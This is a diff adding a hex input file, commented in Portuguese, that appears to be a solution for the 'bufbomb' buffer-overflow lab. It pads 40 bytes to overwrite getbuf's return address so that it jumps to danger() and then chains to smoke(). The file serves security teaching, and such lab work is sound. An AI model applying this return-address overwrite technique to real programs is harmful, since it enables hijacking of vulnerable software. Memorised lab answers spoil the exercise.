@@ -1,0 +1,21 @@
+/* String invasora 2 para bufbomb - chama danger() e depois smoke() */
+/* Estrutura da pilha após o overflow:
+ * - 40 bytes de preenchimento (buf[32] + saved_rbp[8])
+ * - 8 bytes: endereço de danger (0x401206) - sobrescreve return de getbuf
+ * - 8 bytes: endereço de smoke (0x401267) - será o return de danger
+ */
+
+/* Preenchimento: 40 bytes (buf + saved_rbp) */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+
+/* Endereço de danger (0x0000000000401206) em little-endian */
+/* Este sobrescreve o return address de getbuf */
+06 12 40 00 00 00 00 00
+
+/* Endereço de smoke (0x0000000000401267) em little-endian */
+/* Este será o return address para danger */
+67 12 40 00 00 00 00 00
